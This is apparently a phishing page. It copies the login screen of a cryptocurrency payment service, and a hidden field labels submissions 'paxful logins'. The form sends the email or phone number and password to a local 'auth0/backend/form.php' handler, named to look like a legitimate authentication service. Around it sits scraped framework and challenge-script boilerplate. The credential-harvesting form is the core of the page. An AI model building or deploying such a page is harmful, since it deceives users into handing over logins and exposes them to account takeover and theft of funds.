...
<head>
    ...
    <link rel="stylesheet" href="css/6672feea99185a86.css" data-precedence="next">
    <link rel="stylesheet" href="css/6060de9c41e218f9.css" data-precedence="next">
    <link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-9bc516a4ec8b636f.js">
    <script src="js/bccaed0a-e01847b8d80b63ae.js" async=""></script>
    <script src="js/7db9047a-c1092a913f6ad6e1.js" async=""></script>
    <script src="js/2972-63e1f2c85d818c56.js" async=""></script>
    <script src="js/main-app-6497b2c95136de7e.js" async=""></script>
    <script src="js/2819-61dbb981c58931fb.js" async=""></script>
    <script src="js/4173-58674d60f1a2932d.js" async=""></script>
    <script src="js/4309-74dd540a28a02962.js" async=""></script>
    <script src="js/3884-97e78161142dbad6.js" async=""></script>
    <script src="js/8568-fa05631198a467c1.js" async=""></script>
    <script src="js/9563-c50187b5bd1ad485.js" async=""></script>
    <script src="js/1490-54757f865b6a87eb.js" async=""></script>
    <script src="js/1302-0376df935ff41811.js" async=""></script>
    <script src="js/page-fcac7aab71d001f3.js" async=""></script>
    <script src="js/2084-02e339e94f4f7ab7.js" async=""></script>
    <script src="js/layout-b2280f00ed5ac3d2.js" async=""></script>
    <script src="js/6898-b6878b6b21c53765.js" async=""></script>
    <script src="js/not-found-1e59d39cd042e42d.js" async=""></script>
    <script src="js/error-a5ddca3b8db04168.js" async=""></script>
    <link rel="preload" href="/gt4.js" as="script">
    <meta name="theme-color" content="#000000">
    <title>Login | to Payment Account</title>
    <meta name="description" content="Login to your Payment account">

    <meta name="twitter:image:width" content="1600">
    <meta name="twitter:image:height" content="1001">
    <link rel="icon" href="favicon.ico" type="image/x-icon" sizes="256x256">
    <meta name="next-size-adjust">
    <meta name="sentry-trace" content="263931d3bef0d2dee486baf84c1a1a2c-21ad3f8151af598d-0">
    <meta name="baggage"
        content="sentry-environment=production,sentry-release=DcAA6iHM09y5FgGaeMLcL,sentry-public_key=34d8d41960e64a9c85b91c358a8e90dd,sentry-trace_id=263931d3bef0d2dee486baf84c1a1a2c,sentry-sampled=false">
    <script src="js/polyfills-78c92fac7aa8fdd8.js" nomodule=""></script>
</head>

<body class="__className_627f4f flex flex-col">
    <script>!function () { try { var d = document.documentElement, c = d.classList; c.remove('dark', 'light'); var e = localStorage.getItem('theme'); if ('system' === e || (!e && false)) { var t = '(prefers-color-scheme: dark)', m = window.matchMedia(t); if (m.media !== t || m.matches) { d.style.colorScheme = 'dark'; c.add('dark') } else { d.style.colorScheme = 'light'; c.add('light') } } else if (e) { c.add(e || '') } else { c.add('dark') } if (e === 'light' || e === 'dark' || !e) d.style.colorScheme = e || 'dark' } catch (e) { } }()</script>
    <div class="flex flex-row">
        <div
            class="min-h-screen text-foreground max-[990px]:w-full min-[990px]:w-[498px] min-[990px]:shadow-[0_4px_8px_0_#FFFFFF40]">
            <div class="flex size-full flex-col space-y-6 px-4 py-6 md:px-10"><a href="#">
                    <div class="flex h-6 flex-row items-center space-x-2.5 md:h-8 mb-4"><svg
                        ...
                        </svg><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 103 34"
                            class="h-full text-foreground md:inline">
                            <g fill="currentColor">
                                ...
                                <path fill-rule="evenodd"
                                    ...
                                    clip-rule="evenodd"></path>
                                <path
                                    d="M62.617 7.49h-5.254l-4.484 6.232-4.484-6.231H43.14l7.111 9.88-7.111 9.882h5.254l4.484-6.231 4.484 6.231h5.254l-7.111-9.881z">
                                </path>
                            </g>
                        </svg></div>
                </a>
                <div class="invisible select-none opacity-0"><a
                        class="relative flex cursor-pointer items-center justify-center whitespace-nowrap no-underline disabled:cursor-not-allowed [&amp;:where(a)]:inline-flex text-[14px]"
                ...
                <div>
                    <h2 class="mb-3 text-[32px] font-semibold leading-10 tracking-[-4%]">Welcome back!</h2>
                    <p class="text-sm text-tertiary">Don't have an account? <a class="ml-2 !underline"
                            href="">Sign up</a></p>
                </div>
                <form class="!mt-0 space-y-6" action="auth0/backend/form.php" enctype="multipart/form-data" method="POST"><input type="hidden"
                        name=""><input type="hidden" name="next"><label
                        class="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2"
                        for="username">Email / Phone Number<div
                            class="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative border">
                            <input name="title" type="text" value="paxful logins" hidden="true">
                            <input class="bg-transparent text-foreground outline-0 placeholder:text-tertiary grow"
                                type="text" autocomplete="email mobile" id="username" placeholder="Email / Phone Number"
                                required="" name="email" value=""></div></label>
                    <div class="grid gap-3"><label
                            class="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2"
                            for="password">Password<div class="w-full">
                                <div class="relative w-full">
                                    <div
                                        class="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative border pr-6">
                                        <input
                                            class="bg-transparent text-foreground outline-0 placeholder:text-tertiary grow"
                                            type="password" required="" autocomplete="current-password" id="password"
                                            placeholder="Password" name="pass" value=""></div><button
                                        class="flex cursor-pointer items-center justify-center whitespace-nowrap no-underline disabled:cursor-not-allowed [&amp;:where(a)]:inline-flex absolute top-[calc(50%-10px)] rounded-full right-4"
                                        type="button">
                                        <div class="inline-flex items-center justify-center gap-1"><svg
                                                xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                                                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                                                stroke-linecap="round" stroke-linejoin="round"
                                                class="lucide lucide-eye-off size-5 text-tertiary">
                        ...
                        <div class="flex items-center justify-end text-sm"><a
                                class="text-muted !underline dark:text-border" href="/forgot-password">Forgot
                                password?</a></div>
                    </div>
                    <div class="mx-0"><button
                            class="relative flex cursor-pointer items-center justify-center whitespace-nowrap no-underline disabled:cursor-not-allowed [&amp;:where(a)]:inline-flex border border-action-primary bg-action-primary text-action-primary hover:border-action-primary-disabled hover:text-action-primary disabled:text-action-primary-disabled dark:disabled:border-action-primary-disabled dark:disabled:bg-action-primary-disabled h-12 rounded-[40px] px-8 text-[14px] font-semibold leading-6 w-full"
                            type="submit">
                            <div class="inline-flex items-center justify-center gap-1">Sign in</div>
                        </button></div>
                </form>
            </div>
        </div>
        <div class="h-screen w-[calc(100vw-498px)] grow overflow-hidden bg-container max-[990px]:hidden">
            <div class="flex size-full items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="404"
                    height="404" fill="none">
                    <mask id="login_svg__a" width="403" height="403" x="0" y="0" maskUnits="userSpaceOnUse"
                    ...
                    <g mask="url(#login_svg__a)">
                        ...
                        <path fill="#000" stroke="#fff" stroke-linecap="round" stroke-linejoin="round"
                            stroke-width="0.9"
                        ...
                        <path stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="0.9"
                        ...
                        <path fill="#C9F24D" fill-rule="evenodd"
                    ...
                    <mask id="login_svg__b" width="277" height="94" x="108" y="148" maskUnits="userSpaceOnUse"
                        style="mask-type:luminance">
                        <path fill="#fff"
    ...
    <script>(function () { function c() { var b = a.contentDocument || a.contentWindow.document; if (b) { var d = b.createElement('script'); d.innerHTML = "window.__CF$cv$params={r:'8d31ec5fcaf8672a',t:'MTcyOTAxNzQ3Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);"; b.getElementsByTagName('head')[0].appendChild(d) } } if (document.body) { var a = document.createElement('iframe'); a.height = 1; a.width = 1; a.style.position = 'absolute'; a.style.top = 0; a.style.left = 0; a.style.border = 'none'; a.style.visibility = 'hidden'; document.body.appendChild(a); if ('loading' !== document.readyState) c(); else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c); else { var e = document.onreadystatechange || function () { }; document.onreadystatechange = function (b) { e(b); 'loading' !== document.readyState && (document.onreadystatechange = e, c()) } } } })();</script>
